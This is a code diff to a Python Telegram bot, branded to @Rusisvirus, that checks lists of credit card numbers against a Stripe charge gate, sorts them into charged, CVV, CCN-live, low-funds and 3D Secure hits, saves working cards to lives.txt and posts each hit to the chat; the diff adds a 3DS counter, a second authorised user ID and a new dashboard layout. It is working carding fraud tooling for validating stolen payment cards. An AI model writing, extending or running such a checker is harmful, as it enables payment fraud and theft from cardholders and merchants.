@@ -16,32 +16,51 @@ bot = telebot.TeleBot(token, parse_mode="HTML")
 # ==========================================
 ALLOWED_IDS = [
     '1915369904',    # Owner
-    '',     # User 2
+    '1696442023',    # User 2
     '',     # User 3
     ''      # User 4
 ]
 
 # ==========================================
-# 🎨 UI HELPER FUNCTION (SIMPLE LIST STYLE)
+# 🎨 UI HELPER FUNCTION (ADDED 3DS)
 # ==========================================
-def get_dashboard_ui(total, current, live, die, ccn, low, cvv, last_cc):
-    # CC Masking (Privacy)
-    if len(last_cc) > 10:
-        masked_cc = last_cc
+def get_dashboard_ui(total, current, live, die, ccn, low, cvv, threeds, last_cc, last_response):
+    # Percentage Calculation
+    percent = int((current / total) * 100) if total > 0 else 0
+    
+    # CC Privacy
+    if len(last_cc) < 10:
+        display_cc = "Wait..."
     else:
-        masked_cc = "Wait..."
+        display_cc = last_cc
 
+    # Response Shortener
+    if len(last_response) > 40:
+        display_response = last_response[:40] + "..."
+    else:
+        display_response = last_response
+
+    # The Design (Balanced 2x3 Layout)
+    line = "━━━━━━━━━━━━━━━━━━"
+    
     text = (
-        f"⚡ <b>Checking Payment Gateway...</b>\n\n"
-        f"💳 <b>Card:</b> <code>{masked_cc}</code>\n"
-        f"📂 <b>Total:</b> {current} / {total}\n\n"
-        f"● <b>Live Hits:</b> {live}\n"
-        f"● <b>Dead Cards:</b> {die}\n"
-        f"● <b>CCN Found:</b> {ccn}\n"
-        f"● <b>Low Funds:</b> {low}"
+        f"{line}\n"
+        f"• <b>RUSISVIRUS | VIP 🇲🇲</b>\n"
+        f"{line}\n"
+        f"• <code>{display_cc}</code>\n"
+        f"• <b>Result:</b> {display_response}\n"
+        f"• <b>Stripe Charge ($0.5)</b>\n"
+        f"{line}\n"
+        f"• <b>Hits:</b> {live}    • <b>Dead:</b> {die}\n"
+        f"• <b>CVV:</b>  {cvv}    • <b>CCN:</b>  {ccn}\n"
+        f"• <b>Low:</b>   {low}    • <b>3Ds:</b>   {threeds}\n" 
+        f"{line}\n"
+        f"• <b>Processing...</b> {percent}%"
     )
+    
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("⛔ STOP", callback_data="stop"))
+    
     return text, markup
 
 # ==========================================
@@ -95,6 +114,7 @@ def run_checker(message):
     ccn = 0
     cvv = 0
     lowfund = 0
+    threeds = 0  # <--- New 3Ds Counter Added
     
     chat_id = message.chat.id
     
@@ -102,7 +122,6 @@ def run_checker(message):
     stop_file = f"stop_{chat_id}.stop"
 
     try:
-        # Initial Message
         ko = bot.reply_to(message, "𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐍𝐨𝐰! 🚀").message_id
         ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
         
@@ -113,21 +132,21 @@ def run_checker(message):
             lino = file.readlines()
             total = len(lino)
             
-            # 🔥 FIX: Show UI Immediately (Before Loop Starts)
-            view_text, markup = get_dashboard_ui(total, 0, 0, 0, 0, 0, 0, "Wait...")
+            # Initial UI
+            view_text, markup = get_dashboard_ui(total, 0, 0, 0, 0, 0, 0, 0, "Wait...", "Starting...")
             bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
 
             for index, cc in enumerate(lino, 1):
                 cc = cc.strip()
                 
-                # ===== STOP CHECK (1) =====
+                # STOP Check
                 if os.path.exists(stop_file):
                     bot.edit_message_text(chat_id=chat_id, message_id=ko, text='🛑 <b>STOPPED (User Request)</b>')
                     os.remove(stop_file)
                     if os.path.exists(file_name): os.remove(file_name)
                     return
-                
-                # ===== BIN LOOKUP =====
+
+                # BIN Lookup
                 try:
                     data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                 except:
@@ -139,7 +158,7 @@ def run_checker(message):
                 country_flag = data.get('country_flag', '')
                 bank = data.get('bank', 'Unknown')
                 
-                # ===== STOP CHECK (2) =====
+                # STOP Check 2
                 if os.path.exists(stop_file):
                     bot.edit_message_text(chat_id=chat_id, message_id=ko, text='🛑 <b>STOPPED (User Request)</b>')
                     os.remove(stop_file)
@@ -148,88 +167,83 @@ def run_checker(message):
 
                 start_time = time.time()
                 
-                # ===== GATE CHECK =====
+                # Gate Check
                 try:
                     last = str(func_timeout(100, Tele, args=(cc,)))
                 except FunctionTimedOut:
                     last = 'Gateway Time Out ❌'
                 except Exception as e:
                     print(e)
-                    last = 'Error'
+                    last = 'System Error ⚠️'
                 
                 end_time = time.time()
                 execution_time = end_time - start_time
                 
-                # ==========================================
-                # 🔥 DASHBOARD UPDATE LOGIC
-                # ==========================================
+                is_hit = 'Payment Successful!' in last or 'funds' in last or 'security code' in last or 'Your card does not support' in last or 'completion' in last
                 
-                is_hit = 'Donation Successful!' in last or 'funds' in last or 'security code' in last or 'Your card does not support' in last
-                
-                # Update UI: If Hit OR 1st Card OR Every 5 Cards OR Last Card
-                if is_hit or (index == 1) or (index % 5 == 0) or (index == total):
-                    view_text, markup = get_dashboard_ui(total, index, ch, dd, ccn, lowfund, cvv, cc)
+                # Update UI
+                if is_hit or (index == 1) or (index % 8 == 0) or (index == total):
+                    view_text, markup = get_dashboard_ui(total, index, ch, dd, ccn, lowfund, cvv, threeds, cc, last)
                     try:
                         bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                     except Exception as e:
                         pass 
                 
-                # ==========================================
-                # ✅ RESULTS HANDLING
-                # ==========================================
                 print(f"{chat_id} : {cc} -> {last}")
                 
-                if 'Donation Successful!' in last or 'funds' in last:
+                if 'Payment Successful!' in last or 'funds' in last:
                     with open("lives.txt", "a") as f:
                         f.write(f"{cc} - {last} - {bank} ({country})\n")
 
-                if 'Donation Successful!' in last:
+                # ==========================================
+                # 🔥 RESULT MESSAGES
+                # ==========================================
+                line = "━━━━━━━━━━━━━━━━━━"
+                
+                if 'Payment Successful!' in last:
                     ch += 1
-                    msg = f'''✅ <b>Charge Hit!</b>
-━━━━━━━━━━━━━━━━━━━━
-💳 <code>{cc}</code>
-🚀 <b>Response:</b> Payment Successful ✅
-━━━━━━━━━━━━━━━━━━━━
-🏦 <b>Bin:</b> {brand} - {card_type}
-🏛 <b>Bank:</b> {bank}
-🌍 <b>Country:</b> {country} - {country_flag}
-⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
-━━━━━━━━━━━━━━━━━━━━
-<b>Bot by:</b> @Rusisvirus'''
+                    msg = f'''{line}
+• <code>{cc}</code>
+• <b>Result:</b> PAYMENT SUCCESSFUL! ✅
+{line}
+• <b>Bin:</b> {brand} - {card_type}
+• <b>Bank:</b> {bank}
+• <b>Country:</b> {country} - {country_flag}
+• <b>Time:</b> {execution_time:.1f} sec
+{line}
+<b>Bot by: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                     
                 elif 'Your card does not support this type of purchase' in last:
                     cvv += 1
-                    msg = f'''✅ <b>CVV Hit!</b>
-━━━━━━━━━━━━━━━━━━━━
-💳 <code>{cc}</code>
-🚀 <b>Response:</b> CVV Mismatch ⚠️
-━━━━━━━━━━━━━━━━━━━━
-🏦 <b>Bin:</b> {brand} - {card_type}
-🏛 <b>Bank:</b> {bank}
-🌍 <b>Country:</b> {country} - {country_flag}
-⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
-━━━━━━━━━━━━━━━━━━━━
-<b>Bot by:</b> @Rusisvirus'''
+                    msg = f'''{line}
+• <code>{cc}</code>
+• <b>Result:</b> CVV MATCH ✅
+{line}
+• <b>Bin:</b> {brand} - {card_type}
+• <b>Bank:</b> {bank}
+• <b>Country:</b> {country} - {country_flag}
+• <b>Time:</b> {execution_time:.1f} sec
+{line}
+<b>Bot by: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                 
                 elif 'security code is incorrect' in last or 'security code is invalid' in last:
                     ccn += 1
-                    msg = f'''🔐 <b>CCN Live!</b>
-━━━━━━━━━━━━━━━━━━━━
-💳 <code>{cc}</code>
-🚀 <b>Response:</b> CCN Live ✅
-━━━━━━━━━━━━━━━━━━━━
-🏦 <b>Bin:</b> {brand} - {card_type}
-🏛 <b>Bank:</b> {bank}
-🌍 <b>Country:</b> {country} - {country_flag}
-⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
-━━━━━━━━━━━━━━━━━━━━
-<b>Bot by:</b> @Rusisvirus'''
+                    msg = f'''{line}
+• <code>{cc}</code>
+• <b>Result:</b> CCN LIVE ✅
+{line}
+• <b>Bin:</b> {brand} - {card_type}
+• <b>Bank:</b> {bank}
+• <b>Country:</b> {country} - {country_flag}
+• <b>Time:</b> {execution_time:.1f} sec
+{line}
+<b>Bot by: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                     
-                    # Update UI immediately for CCN
-                    view_text, markup = get_dashboard_ui(total, index, ch, dd, ccn, lowfund, cvv, cc)
+                    # Update UI immediately for Hits
+                    view_text, markup = get_dashboard_ui(total, index, ch, dd, ccn, lowfund, cvv, threeds, cc, last)
                     try:
                         bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                     except:
@@ -237,32 +251,30 @@ def run_checker(message):
                     
                 elif 'funds' in last:
                     lowfund += 1
-                    msg = f'''⚠️ <b>Insufficient Funds!</b>
-━━━━━━━━━━━━━━━━━━━━
-💳 <code>{cc}</code>
-🚀 <b>Response:</b> Low Funds ⛔
-━━━━━━━━━━━━━━━━━━━━
-🏦 <b>Bin:</b> {brand} - {card_type}
-🏛 <b>Bank:</b> {bank}
-🌍 <b>Country:</b> {country} - {country_flag}
-⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
-━━━━━━━━━━━━━━━━━━━━
-<b>Bot by:</b> @Rusisvirus'''
+                    msg = f'''{line}
+• <code>{cc}</code>
+• <b>Result:</b> INSUFFICIENT FUNDS! 🚫
+{line}
+• <b>Bin:</b> {brand} - {card_type}
+• <b>Bank:</b> {bank}
+• <b>Country:</b> {country} - {country_flag}
+• <b>Time:</b> {execution_time:.1f} sec
+{line}
+<b>Bot by: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                     
                 elif 'The payment needs additional action before completion!' in last:
-                    cvv += 1
-                    msg = f'''⚠️ <b>3D Secure!</b>
-━━━━━━━━━━━━━━━━━━━━
-💳 <code>{cc}</code>
-🚀 <b>Response:</b> 3D Action Required 🔄
-━━━━━━━━━━━━━━━━━━━━
-🏦 <b>Bin:</b> {brand} - {card_type}
-🏛 <b>Bank:</b> {bank}
-🌍 <b>Country:</b> {country} - {country_flag}
-⏱ <b>Time:</b> {"{:.1f}".format(execution_time)} sec
-━━━━━━━━━━━━━━━━━━━━
-<b>Bot by:</b> @Rusisvirus'''
+                    threeds += 1  # <--- Increment 3Ds Counter
+                    msg = f'''{line}
+• <code>{cc}</code>
+• <b>Result:</b> 3D ACTION REQUIRED ⚠️
+{line}
+• <b>Bin:</b> {brand} - {card_type}
+• <b>Bank:</b> {bank}
+• <b>Country:</b> {country} - {country_flag}
+• <b>Time:</b> {execution_time:.1f} sec
+{line}
+<b>Bot by: @Rusisvirus</b>'''
                     bot.reply_to(message, msg)
                         
                 else:
@@ -286,7 +298,7 @@ def menu_callback(call):
     bot.answer_callback_query(call.id, "Stopping...")
 
 # ===== POLLING =====
-print("🤖 Simple UI Bot Started...")
+print("🤖 Bot Started (Added 3Ds Support)...")
 while True:
     try:
         bot.polling(non_stop=True, timeout=20, long_polling_timeout=20)
